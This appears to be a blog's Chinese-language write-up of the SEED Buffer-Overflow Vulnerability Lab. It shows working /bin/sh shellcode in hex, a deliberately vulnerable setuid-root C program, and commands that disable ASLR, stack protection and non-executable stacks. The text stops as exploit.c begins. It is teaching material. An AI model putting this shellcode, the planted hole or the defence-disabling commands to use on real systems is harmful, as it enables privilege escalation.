<!DOCTYPE html>
<html lang="en-US">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>Buffer-Overflow Vulnerability Lab | SmacUL&#39;s Blog</title>
    <meta name="description" content="你好">
    <link rel="icon" href="/assets/img/Logo.png">
    
    <link rel="preload" href="/assets/css/0.styles.e8ff0ee6.css" as="style"><link rel="preload" href="/assets/js/app.27d58fa7.js" as="script"><link rel="preload" href="/assets/js/2.f1f09924.js" as="script"><link rel="preload" href="/assets/js/35.15ecee78.js" as="script"><link rel="prefetch" href="/assets/js/10.da04177b.js"><link rel="prefetch" href="/assets/js/11.33537db2.js"><link rel="prefetch" href="/assets/js/12.2c196981.js"><link rel="prefetch" href="/assets/js/13.501a5542.js"><link rel="prefetch" href="/assets/js/14.93a9b12d.js"><link rel="prefetch" href="/assets/js/15.7ddd6566.js"><link rel="prefetch" href="/assets/js/16.32ee58e2.js"><link rel="prefetch" href="/assets/js/17.c415498a.js"><link rel="prefetch" href="/assets/js/18.5ef64d19.js"><link rel="prefetch" href="/assets/js/19.521006c9.js"><link rel="prefetch" href="/assets/js/20.1aa33ed7.js"><link rel="prefetch" href="/assets/js/21.82b9d691.js"><link rel="prefetch" href="/assets/js/22.793f9d85.js"><link rel="prefetch" href="/assets/js/23.0ca70d66.js"><link rel="prefetch" href="/assets/js/24.d86f1591.js"><link rel="prefetch" href="/assets/js/25.2ce3a84b.js"><link rel="prefetch" href="/assets/js/26.12cdc3ac.js"><link rel="prefetch" href="/assets/js/27.7b341d36.js"><link rel="prefetch" href="/assets/js/28.61c57439.js"><link rel="prefetch" href="/assets/js/29.90d6873f.js"><link rel="prefetch" href="/assets/js/3.7db0d588.js"><link rel="prefetch" href="/assets/js/30.4f5e13f5.js"><link rel="prefetch" href="/assets/js/31.7ec86adf.js"><link rel="prefetch" href="/assets/js/32.0c179479.js"><link rel="prefetch" href="/assets/js/33.b68ce17c.js"><link rel="prefetch" href="/assets/js/34.6d314a9c.js"><link rel="prefetch" href="/assets/js/36.d6998519.js"><link rel="prefetch" href="/assets/js/37.e84aeb89.js"><link rel="prefetch" href="/assets/js/38.8bd5bba9.js"><link rel="prefetch" href="/assets/js/39.ffd3bce6.js"><link rel="prefetch" href="/assets/js/4.9b31f553.js"><link rel="prefetch" href="/assets/js/40.1b57eaa8.js"><link rel="prefetch" href="/assets/js/41.ac6f9062.js"><link rel="prefetch" href="/assets/js/42.8854bf5a.js"><link rel="prefetch" href="/assets/js/43.91bf82a7.js"><link rel="prefetch" href="/assets/js/44.c35012af.js"><link rel="prefetch" href="/assets/js/45.07b8e581.js"><link rel="prefetch" href="/assets/js/46.02916103.js"><link rel="prefetch" href="/assets/js/47.f1be0d43.js"><link rel="prefetch" href="/assets/js/48.7f7c7f55.js"><link rel="prefetch" href="/assets/js/49.6692487b.js"><link rel="prefetch" href="/assets/js/5.23b29502.js"><link rel="prefetch" href="/assets/js/50.6c2f6d29.js"><link rel="prefetch" href="/assets/js/51.f7be7c31.js"><link rel="prefetch" href="/assets/js/52.b9dad83f.js"><link rel="prefetch" href="/assets/js/53.8f778f89.js"><link rel="prefetch" href="/assets/js/54.9853cbd5.js"><link rel="prefetch" href="/assets/js/55.f1dfad52.js"><link rel="prefetch" href="/assets/js/56.a89162ce.js"><link rel="prefetch" href="/assets/js/57.b1f1111f.js"><link rel="prefetch" href="/assets/js/58.08f753ab.js"><link rel="prefetch" href="/assets/js/59.e2ff4e09.js"><link rel="prefetch" href="/assets/js/6.ca86ed4c.js"><link rel="prefetch" href="/assets/js/60.14c1ce69.js"><link rel="prefetch" href="/assets/js/61.06a9c523.js"><link rel="prefetch" href="/assets/js/62.af6d0bf2.js"><link rel="prefetch" href="/assets/js/63.47139735.js"><link rel="prefetch" href="/assets/js/64.1b3689b6.js"><link rel="prefetch" href="/assets/js/65.c599d8e8.js"><link rel="prefetch" href="/assets/js/66.91648506.js"><link rel="prefetch" href="/assets/js/67.ecf7742c.js"><link rel="prefetch" href="/assets/js/68.b8769d15.js"><link rel="prefetch" href="/assets/js/69.e055ff05.js"><link rel="prefetch" href="/assets/js/7.9d170f74.js"><link rel="prefetch" href="/assets/js/70.065d9e72.js"><link rel="prefetch" href="/assets/js/71.840612b5.js"><link rel="prefetch" href="/assets/js/72.2a605e0c.js"><link rel="prefetch" href="/assets/js/73.3e54fae5.js"><link rel="prefetch" href="/assets/js/74.8e626e7b.js"><link rel="prefetch" href="/assets/js/75.c64b57c0.js"><link rel="prefetch" href="/assets/js/76.0e7007be.js"><link rel="prefetch" href="/assets/js/77.c8b770b0.js"><link rel="prefetch" href="/assets/js/78.d7da3c62.js"><link rel="prefetch" href="/assets/js/79.a78c6d63.js"><link rel="prefetch" href="/assets/js/8.3616387d.js"><link rel="prefetch" href="/assets/js/80.dda2cb25.js"><link rel="prefetch" href="/assets/js/81.2f232306.js"><link rel="prefetch" href="/assets/js/82.df6bca63.js"><link rel="prefetch" href="/assets/js/83.6251af59.js"><link rel="prefetch" href="/assets/js/84.d3eda27f.js"><link rel="prefetch" href="/assets/js/85.71180abd.js"><link rel="prefetch" href="/assets/js/86.3c5a5f86.js"><link rel="prefetch" href="/assets/js/87.12474af5.js"><link rel="prefetch" href="/assets/js/9.c04fa05e.js">
    <link rel="stylesheet" href="/assets/css/0.styles.e8ff0ee6.css">
  </head>
  <body>
    <div id="app" data-server-rendered="true"><div class="theme-container"><header class="navbar"><div class="sidebar-button"><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" role="img" viewBox="0 0 448 512" class="icon"><path fill="currentColor" d="M436 124H12c-6.627 0-12-5.373-12-12V80c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12z"></path></svg></div> <a href="/" class="home-link router-link-active"><!----> <span class="site-name">SmacUL's Blog</span></a> <div class="links"><div class="search-box"><input aria-label="Search" autocomplete="off" spellcheck="false" value=""> <!----></div> <nav class="nav-links can-hide"><div class="nav-item"><a href="/" class="nav-link">主页</a></div><div class="nav-item"><a href="/self/" class="nav-link">关于我</a></div><div class="nav-item"><a href="https://github.com/SmacUL" target="_blank" rel="noopener noreferrer" class="nav-link external">
  GitHub
  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></div> <!----></nav></div></header> <div class="sidebar-mask"></div> <aside class="sidebar"><nav class="nav-links"><div class="nav-item"><a href="/" class="nav-link">主页</a></div><div class="nav-item"><a href="/self/" class="nav-link">关于我</a></div><div class="nav-item"><a href="https://github.com/SmacUL" target="_blank" rel="noopener noreferrer" class="nav-link external">
  GitHub
  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></div> <!----></nav>  <ul class="sidebar-links"><li><a href="/log/seed_labs/" class="sidebar-link">Seed Labs</a></li><li><a href="/log/seed_labs/Cross-Site Scripting Attack.html" class="sidebar-link">Cross-Site Scripting Attack</a></li><li><a href="/log/seed_labs/SQL Injection Attack Lab.html" class="sidebar-link">SQL Injection Attack Lab</a></li><li><a href="/log/seed_labs/Buffer-Overflow Vulnerability Lab.html" class="active sidebar-link">Buffer-Overflow Vulnerability Lab</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/log/seed_labs/Buffer-Overflow Vulnerability Lab.html#pre-experiment" class="sidebar-link">Pre-Experiment</a></li><li class="sidebar-sub-header"><a href="/log/seed_labs/Buffer-Overflow Vulnerability Lab.html#turning-off-countermeasures" class="sidebar-link">Turning Off Countermeasures</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/log/seed_labs/Buffer-Overflow Vulnerability Lab.html#address-space-randomization" class="sidebar-link">Address Space Randomization</a></li><li class="sidebar-sub-header"><a href="/log/seed_labs/Buffer-Overflow Vulnerability Lab.html#the-stackguard-protection-scheme" class="sidebar-link">The StackGuard Protection Scheme</a></li><li class="sidebar-sub-header"><a href="/log/seed_labs/Buffer-Overflow Vulnerability Lab.html#non-executable-stack" class="sidebar-link">Non-Executable Stack</a></li><li class="sidebar-sub-header"><a href="/log/seed_labs/Buffer-Overflow Vulnerability Lab.html#configuring-bin-sh-ubuntu-16-04-vm-only" class="sidebar-link">Configuring /bin/sh (Ubuntu 16.04 VM only)</a></li></ul></li><li class="sidebar-sub-header"><a href="/log/seed_labs/Buffer-Overflow Vulnerability Lab.html#t1-running-shellcode" class="sidebar-link">T1 Running Shellcode</a></li><li class="sidebar-sub-header"><a href="/log/seed_labs/Buffer-Overflow Vulnerability Lab.html#the-vulnerable-program-stack-c" class="sidebar-link">The Vulnerable Program -- stack.c</a></li><li class="sidebar-sub-header"><a href="/log/seed_labs/Buffer-Overflow Vulnerability Lab.html#t2-exploiting-the-vulnerability" class="sidebar-link">T2 Exploiting the Vulnerability</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/log/seed_labs/Buffer-Overflow Vulnerability Lab.html#代码解释与说明" class="sidebar-link">代码解释与说明</a></li><li class="sidebar-sub-header"><a href="/log/seed_labs/Buffer-Overflow Vulnerability Lab.html#操作流程" class="sidebar-link">操作流程</a></li><li class="sidebar-sub-header"><a href="/log/seed_labs/Buffer-Overflow Vulnerability Lab.html#结果" class="sidebar-link">结果</a></li></ul></li><li class="sidebar-sub-header"><a href="/log/seed_labs/Buffer-Overflow Vulnerability Lab.html#t3-defeating-dash’s-countermeasure" class="sidebar-link">T3 Defeating dash’s Countermeasure</a></li><li class="sidebar-sub-header"><a href="/log/seed_labs/Buffer-Overflow Vulnerability Lab.html#t4-defeating-address-randomization" class="sidebar-link">T4 Defeating Address Randomization</a></li><li class="sidebar-sub-header"><a href="/log/seed_labs/Buffer-Overflow Vulnerability Lab.html#t5-turn-on-the-stackguard-protection" class="sidebar-link">T5 Turn on the StackGuard Protection</a></li><li class="sidebar-sub-header"><a href="/log/seed_labs/Buffer-Overflow Vulnerability Lab.html#t6-turn-on-the-non-executable-stack-protection" class="sidebar-link">T6 Turn on the Non-executable Stack Protection</a></li></ul></li><li><a href="/log/seed_labs/Packet Sniffing and Spoofing Lab.html" class="sidebar-link">Packet Sniffing and Spoofing Lab</a></li><li><a href="/log/seed_labs/Public-Key Infrastructure Lab.html" class="sidebar-link">Public-Key Infrastructure Lab</a></li><li><a href="/log/seed_labs/Local DNS Attack Lab.html" class="sidebar-link">Local DNS Attack Lab</a></li><li><a href="/log/seed_labs/Remote DNS Cache Poisoning Attack Lab.html" class="sidebar-link">Remote DNS Cache Poisoning Attack Lab</a></li><li><a href="/log/seed_labs/Android Repackaging Attack Lab.html" class="sidebar-link">Android Repackaging Attack Lab</a></li><li><a href="/log/seed_labs/Return-to-libc Attack Lab.html" class="sidebar-link">Return-to-libc Attack Lab</a></li><li><a href="/log/seed_labs/Virtual Private Network Lab.html" class="sidebar-link">Virtual Private Network Lab</a></li><li><a href="/log/seed_labs/Heartbleed Attack Lab.html" class="sidebar-link">Heartbleed Attack Lab</a></li></ul> </aside> <main class="page"> <div class="theme-default-content content__default"><h1 id="buffer-overflow-vulnerability-lab"><a href="#buffer-overflow-vulnerability-lab" class="header-anchor">#</a> Buffer-Overflow Vulnerability Lab</h1> <h2 id="pre-experiment"><a href="#pre-experiment" class="header-anchor">#</a> Pre-Experiment</h2> <p>把数据写在固定长度的缓冲区的外面, 但是程序在向缓冲区内写入数据时没有得到良好的保护, 自己程序的栈结构就会被缓冲区外的数据破坏, 这些数据中如果有 &quot;不法分子&quot; 就会进一步制造破坏.</p> <p>这个实验只需要一台虚拟机, 电脑舒服一些.</p> <p><a href="https://seedsecuritylabs.org/Labs_16.04/PDF/Buffer_Overflow.pdf" target="_blank" rel="noopener noreferrer">实验指导<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></p> <p><a href="https://www.cnblogs.com/fanzhidongyzby/p/3250405.html" target="_blank" rel="noopener noreferrer">范志东-缓冲区溢出攻击<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></p> <p>关于范同志的博客, 多嘴 BB 一下. 我大三的时候水过一门课, 好像叫什么编译系统啥来着, 完事老师就扔了一本 自己动手构造编译系统 让我自行处理, 就是他写的. 这哪能啊, 我最后抄了一晚上文档就提交了, 现在想来... 两个毫无瓜葛的人能够再见那就是缘分 hhhhh.</p> <div class="custom-block warning"><p class="custom-block-title">WARNING</p> <p>有一些的问题没解决. 或是有错误的说法. 仅做参考.</p></div> <h2 id="turning-off-countermeasures"><a href="#turning-off-countermeasures" class="header-anchor">#</a> Turning Off Countermeasures</h2> <p>关闭相关的防御机制</p> <h3 id="address-space-randomization"><a href="#address-space-randomization" class="header-anchor">#</a> Address Space Randomization</h3> <p>系统自带的地址空间随机化的机制.</p> <div class="language-sh line-numbers-mode"><pre class="language-sh"><code><span class="token function">sudo</span> sysctl -w kernel.randomize_va_space<span class="token operator">=</span><span class="token number">0</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h3 id="the-stackguard-protection-scheme"><a href="#the-stackguard-protection-scheme" class="header-anchor">#</a> The StackGuard Protection Scheme</h3> <p>编译 C 文件的时候让 GCC 关闭栈保护</p> <div class="language-sh line-numbers-mode"><pre class="language-sh"><code>gcc -fno-stack-protector example.c
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h3 id="non-executable-stack"><a href="#non-executable-stack" class="header-anchor">#</a> Non-Executable Stack</h3> <p>不可执行栈. 这个应该和内存的 stack 与 heap 机制有关.</p> <div class="language-sh line-numbers-mode"><pre class="language-sh"><code>gcc -z execstack -o <span class="token builtin class-name">test</span> test.c     <span class="token comment"># 栈可执行</span>
gcc -z noexecstack -o <span class="token builtin class-name">test</span> test.c   <span class="token comment"># 栈不可执行</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p><a href="https://blog.csdn.net/zither/article/details/443603" target="_blank" rel="noopener noreferrer">参考<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></p> <h3 id="configuring-bin-sh-ubuntu-16-04-vm-only"><a href="#configuring-bin-sh-ubuntu-16-04-vm-only" class="header-anchor">#</a> Configuring /bin/sh (Ubuntu 16.04 VM only)</h3> <p><code>/bin/sh</code> 指向 <code>/bin/dash</code>, 而 dash 在 Ubuntu 16.04 添加了防御机制. 所以将 <code>/bin/sh</code> 指向 <code>/bin/zsh</code></p> <div class="language-sh line-numbers-mode"><pre class="language-sh"><code><span class="token function">sudo</span> <span class="token function">ln</span> -sf /bin/zsh /bin/sh
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><div class="custom-block warning"><p class="custom-block-title">SET-UID 这是什么</p> <p>就是 set user id ?</p></div> <h2 id="t1-running-shellcode"><a href="#t1-running-shellcode" class="header-anchor">#</a> T1 Running Shellcode</h2> <p>体验一下 shellcode</p> <p>代码 <em>task1.c</em></p> <div class="language-C line-numbers-mode"><pre class="language-c"><code><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span> </span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h&gt;</span></span>
<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">char</span> <span class="token operator">*</span>name<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    name<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">&quot;/bin/sh&quot;</span><span class="token punctuation">;</span>
    name<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span> 
    <span class="token function">execve</span><span class="token punctuation">(</span>name<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> name<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br></div></div><p>代码 <em>call_shellcode.c</em> 是 <em>task1.c</em> 的汇编版本.</p> <div class="language-C line-numbers-mode"><pre class="language-c"><code><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h&gt;</span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h&gt;</span></span>

<span class="token keyword">const</span> <span class="token keyword">char</span> code<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span>
    <span class="token string">&quot;\x31\xc0&quot;</span>             <span class="token comment">/* xorl    %eax,%eax              */</span>
    <span class="token string">&quot;\x50&quot;</span>                 <span class="token comment">/* pushl   %eax                   */</span>
    <span class="token string">&quot;\x68&quot;</span><span class="token string">&quot;//sh&quot;</span>           <span class="token comment">/* pushl   $0x68732f2f            */</span>
    <span class="token string">&quot;\x68&quot;</span><span class="token string">&quot;/bin&quot;</span>           <span class="token comment">/* pushl   $0x6e69622f            */</span>
    <span class="token string">&quot;\x89\xe3&quot;</span>             <span class="token comment">/* movl    %esp,%ebx              */</span>
    <span class="token string">&quot;\x50&quot;</span>                 <span class="token comment">/* pushl   %eax                   */</span>
    <span class="token string">&quot;\x53&quot;</span>                 <span class="token comment">/* pushl   %ebx                   */</span>
    <span class="token string">&quot;\x89\xe1&quot;</span>             <span class="token comment">/* movl    %esp,%ecx              */</span>
    <span class="token string">&quot;\x99&quot;</span>                 <span class="token comment">/* cdq                            */</span>
    <span class="token string">&quot;\xb0\x0b&quot;</span>             <span class="token comment">/* movb    $0x0b,%al              */</span>
    <span class="token string">&quot;\xcd\x80&quot;</span>             <span class="token comment">/* int     $0x80                  */</span>
<span class="token punctuation">;</span>

<span class="token comment">/**
 * 等价于: 
 * const char code[] = &quot;\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80&quot;;
 */</span> 

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span> 
    <span class="token comment">// buf 的长度为 25B, 与 code 一致. 为什么不直接使用 code? 据说是为了创造溢出. </span>
    <span class="token function">strcpy</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> code<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// 这啥啊 ?</span>
    <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span> <span class="token punctuation">)</span><span class="token punctuation">)</span> buf<span class="token punctuation">)</span><span class="token punctuation">(</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span> 
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br></div></div><p>程序中间有一段 shellcode. 他的功能等价于 <em>task1.c</em> 的功能.</p> <p>注释中的 shellcode 会好看一些, 它的长度为 25B, 实际字符有 24 个, 最后一个是 <code>\0</code> 结束符号. <code>\x</code> 在 C 中为 16 进制字符的开头, 例如 <code>\x31</code> 为一个字符. shellcode 里面具体干了什么不重要, 知道整体在干啥就行, 不影响后面实验.</p> <div class="custom-block tip"><p class="custom-block-title">TIP</p> <p>指导中给出的 <em>call_shellcode.c</em> 没有引入 string.h, <em>task1.c</em> 没有引入 unistd.h.</p></div> <div class="language-shell line-numbers-mode"><pre class="language-shell"><code>gcc -z execstack -o call_shellcode call_shellcode.c
<span class="token comment"># or</span>
gcc -z execstack -o task1 task1.c
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p>这一步执行完毕后会起一个新的 shell, 一个孤孤单单的 <code>$</code>.</p> <h2 id="the-vulnerable-program-stack-c"><a href="#the-vulnerable-program-stack-c" class="header-anchor">#</a> The Vulnerable Program -- stack.c</h2> <p><em>stack.c</em></p> <div class="language-C line-numbers-mode"><pre class="language-c"><code><span class="token comment">/* Vunlerable program: stack.c */</span>
<span class="token comment">/* You can get this program from the lab's website */</span>

<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h&gt;</span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h&gt;</span></span>

<span class="token macro property">#<span class="token directive keyword">ifndef</span> BUF_SIZE</span>
<span class="token macro property">#<span class="token directive keyword">define</span> BUF_SIZE 24</span>
<span class="token macro property">#<span class="token directive keyword">endif</span></span>

<span class="token keyword">int</span> <span class="token function">bof</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>str<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">char</span> buffer<span class="token punctuation">[</span>BUF_SIZE<span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token comment">// buffer 只有 24B, 而 str 有 517B, 创造溢出. </span>
    <span class="token function">strcpy</span><span class="token punctuation">(</span>buffer<span class="token punctuation">,</span> str<span class="token punctuation">)</span><span class="token punctuation">;</span>       
    <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">char</span> str<span class="token punctuation">[</span><span class="token number">517</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    FILE <span class="token operator">*</span>badfile<span class="token punctuation">;</span>

    <span class="token keyword">char</span> dummy<span class="token punctuation">[</span>BUF_SIZE<span class="token punctuation">]</span><span class="token punctuation">;</span>  
    <span class="token function">memset</span><span class="token punctuation">(</span>dummy<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> BUF_SIZE<span class="token punctuation">)</span><span class="token punctuation">;</span>

    badfile <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">&quot;badfile&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;r&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// 从 badfile 文件中读取 517B 内容, 并交给 bof 方法. </span>
    <span class="token function">fread</span><span class="token punctuation">(</span>str<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">517</span><span class="token punctuation">,</span> badfile<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">bof</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">&quot;Returned Properly\n&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br></div></div><p>编译 <em>stack.c</em> 并修改文件用户与访问权限.</p> <div class="language-sh line-numbers-mode"><pre class="language-sh"><code>gcc -DBUF_SIZE<span class="token operator">=</span><span class="token number">24</span> -o stack -z execstack -fno-stack-protector stack.c
<span class="token function">sudo</span> <span class="token function">chown</span> root stack
<span class="token function">sudo</span> <span class="token function">chmod</span> <span class="token number">4755</span> stack
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><h2 id="t2-exploiting-the-vulnerability"><a href="#t2-exploiting-the-vulnerability" class="header-anchor">#</a> T2 Exploiting the Vulnerability</h2> <p>这个任务在 <em>exploit.c</em> 中修改 buff, 添加合适的内容, 并写入 badfile 中. 这之后运行 <em>stack.c</em>, 如果一切正常, 可以得到一个 root shell.</p> <p><em>exploit.c</em></p> <div class="language-C line-numbers-mode"><div class="highlight-lines"><br><br><br><br><br><br><br><br><br><br><br><br><div class="highlighted"> </div><div class="highlighted"> </div><div class="highlighted"> </div><div class="highlighted"> </div><div class="highlighted"> </div><div class="highlighted"> </div><div class="highlighted"> </div><div class="highlighted"> </div><div class="highlighted"> </div><br><br><br><br><br><br><br></div><pre class="language-c"><code><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h&gt;</span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h&gt;</span></span>
